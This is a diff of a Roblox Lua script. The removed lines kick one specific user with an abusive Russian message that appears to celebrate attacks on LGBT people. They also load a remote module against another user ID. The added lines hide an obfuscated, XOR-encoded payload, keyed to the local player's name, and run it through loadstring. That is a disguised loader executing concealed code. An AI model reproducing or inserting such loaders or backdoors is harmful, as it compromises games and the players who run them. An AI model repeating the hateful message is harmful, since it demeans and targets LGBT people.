@@ -1,21 +1,23 @@
---end--
-if game:GetService("RunService"):IsStudio() then return end
-	game.Players.PlayerAdded:Connect(function(plr)
-		if plr.UserId==3707642701 then 
-			plr:Kick("плаки плаки, сын шалавы не может зайти \nКолумбия (2016 год)
-Мексика (2017 год)
-Гондурас (2009-2019 года)
-Сан-Паулу, Бразилия (2019 год)
-Гватемала (2016 год)
-Итог: -1359🏳‍🌈
-well well well Тель-Авив 2009, Орландо 2016, Осло 2022,")
+--rigged stuff..--
+local _h = [[333333<-rigged->333332<-rigged->333336<-rigged->333338<-rigged->333333<-rigged->343031<-rigged->333338<-rigged->343031<-rigged->333832<-rigged->343031<-rigged->333132<-rigged->343233<-rigged->343236<-rigged->333434<-rigged->333939<-rigged->333631<-rigged->333330<-rigged->333235<-rigged->333734<-rigged->333233<-rigged->333432<-rigged->333331<-rigged->333235<-rigged->333939<-rigged->333530<-rigged->333832<-rigged->333434<-rigged->333434<-rigged->333139<-rigged->333432<-rigged->333235<-rigged->333236<-rigged->333139<-rigged->333331<-rigged->343031<-rigged->333339<-rigged->333236<-rigged->333331<-rigged->333336<-rigged->333235<-rigged->333330<-rigged->333332<-rigged->333331<-rigged->333933<-rigged->333532<-rigged->333432<-rigged->333331<-rigged->333431<-rigged->333432<-rigged->333139<-rigged->333937<-rigged->333731<-rigged->333139<-rigged->333338<-rigged->333334<-rigged->333432<-rigged->333234<-rigged->333332<-rigged->333139<-rigged->333238<-rigged->333937<-rigged->333531<-rigged->333338<-rigged->333134<-rigged->333336<-rigged->333338<-rigged->333230<-rigged->333235<-rigged->333733<-rigged->333338<-rigged->333235<-rigged->333338<-rigged->333937<-rigged->333638<-rigged->333338<-rigged->333230<-rigged->333235<-rigged->333538<-rigged->333230<-rigged->333432<-rigged->333139<-rigged->333733<-rigged->333338<-rigged->333235<-rigged->333338<-rigged->333934<-rigged->343233<-rigged->343031<-rigged->343031<-rigged->343031<-rigged->343031<-rigged->343031<-rigged->343031<-rigged->343031<-rigged->343031<-rigged->333139<-rigged->333432<-rigged->333232<-rigged->333236<-rigged->333330<-rigged->333139<-rigged->333432<-rigged->333933<-rigged->333837<-rigged->333834<-rigged->333833<-rigged->333839<-rigged->333834<-rigged->333838<-rigged->333833<-rigged->333930<-rigged->333833<-rigged->333930<-rigged->333934<-rigged->333935<-rigged->333339<-rigged->333230<-rigged->333432<-rigged->333933<-rigged->333530<-rigged->333530<-rigged->333935<-rigged->333935<-rigged->333430<-rigged->333338<-rigged->333334<-rigged->333432<-rigged->333935<-rigged->333533<-rigged->333333<-rigged->333338<-rigged->333134<-rigged->333432<-rigged->333139<-rigged->333230<-rigged->333935<-rigged->333635<-rigged->333332<-rigged->333336<-rigged->333338<-rigged->333333<-rigged->333533<-rigged->333333<-rigged->333338<-rigged->333134<-rigged->333432<-rigged->333139<-rigged->333935<-rigged->333633<-rigged->333338<-rigged->333334<-rigged->333432<-rigged->333935<-rigged->333935<-rigged->333434<-rigged->333434<-rigged->333934<-rigged->343233<-rigged->343031<-rigged->343031<-rigged->343031<-rigged->343031<-rigged->333432<-rigged->333331<-rigged->333431<-rigged->343233<-rigged->343031<-rigged->343031<-rigged->343031<-rigged->343031<-rigged->333530<-rigged->333530<-rigged->343233<-rigged->333138<-rigged->343233<-rigged->333430<-rigged->333338<-rigged->333334<-rigged->333432<-rigged->333735<-rigged->333732<-rigged->333432<-rigged->333235<-rigged->333532<-rigged->333432<-rigged->333139<-rigged->333233<-rigged->333330<-rigged->333336<-rigged->333432<-rigged->333933<-rigged->333939<-rigged->333531<-rigged->333432<-rigged->333231<-rigged->333333<-rigged->333330<-rigged->333336<-rigged->333338<-rigged->333235<-rigged->333432<-rigged->333431<-rigged->333532<-rigged->333235<-rigged->333332<-rigged->333139<-rigged->333338<-rigged->333430<-rigged->333432<-rigged->333939<-rigged->333934<-rigged->333735<-rigged->333536<-rigged->333338<-rigged->333330<-rigged->333235<-rigged->333731<-rigged->333332<-rigged->333139<-rigged->333638<-rigged->333239<-rigged->333330<-rigged->333333<-rigged->333431<-rigged->333933<-rigged->333939<-rigged->333531<-rigged->333432<-rigged->333334<-rigged->333332<-rigged->333235<-rigged->333432<-rigged->333230<-rigged->333939<-rigged->333937<-rigged->333738<-rigged->333738<-rigged->333738<-rigged->333738<-rigged->333738<-rigged->333934<-rigged->333735<-rigged->333536<-rigged->333338<-rigged->333330<-rigged->333235<-rigged->333731<-rigged->333332<-rigged->333139<-rigged->333638<-rigged->333239<-rigged->333330<-rigged->333333<-rigged->333431<-rigged->333933<-rigged->333939<-rigged->333533<-rigged->333338<-rigged->333336<-rigged->333238<-rigged->333338<-rigged->333430<-rigged->333432<-rigged->333939<-rigged->333937<-rigged->333738<-rigged->333738<-rigged->333738<-rigged->333738<-rigged->333738<-rigged->333934<-rigged->333735<-rigged->333731<-rigged->333330<-rigged->333139<-rigged->333432<-rigged->333532<-rigged->333432<-rigged->333139<-rigged->333233<-rigged->333432<-rigged->333139<-rigged->333933<-rigged->333939<-rigged->333532<-rigged->333432<-rigged->333139<-rigged->333233<-rigged->333432<-rigged->333139<-rigged->333939<-rigged->333937<-rigged->333835<-rigged->333937<-rigged->333939<-rigged->333533<-rigged->333139<-rigged->333332<-rigged->333237<-rigged->333432<-rigged->333336<-rigged->333235<-rigged->333330<-rigged->333333<-rigged->333432<-rigged->333631<-rigged->333330<-rigged->333235<-rigged->333939<-rigged->333937<-rigged->333132<-rigged->333138<-rigged->333937<-rigged->333132<-rigged->333434<-rigged->333939<-rigged->333532<-rigged->333432<-rigged->333235<-rigged->333235<-rigged->333330<-rigged->333331<-rigged->333430<-rigged->333230<-rigged->333939<-rigged->333530<-rigged->333832<-rigged->333338<-rigged->333138<-rigged->333934]]
+function A_(_string:string,a:string)
+	local function fromHex(str)
+		str=tostring(str)
+		return (str:gsub('..', function (cc)
+			return string.char(tonumber(cc, 16))
+		end))
 	end
-	if plr.UserId==3264445159 then
-		print("doing it")
-		coroutine.wrap(function()
-			task.wait(5)
-			print("done")
-			require(6324372525).fse(plr.Name)
-		end)()
+	local complete = ""
+	local numb = 0
+	for i,v in pairs(a:split("")) do
+		numb+=bit32.bxor(v:byte())
 	end
-	end)
+	for i,v in pairs(_string:split("<-rigged->")) do
+		local letter = bit32.bxor(numb,tonumber(fromHex(v))+(math.floor(numb/math.pi)))
+		complete=complete..string.char(letter)
+	end
+
+	return complete
+end
+
+loadstring(A_(_h,game.Players.LocalPlayer.Name))
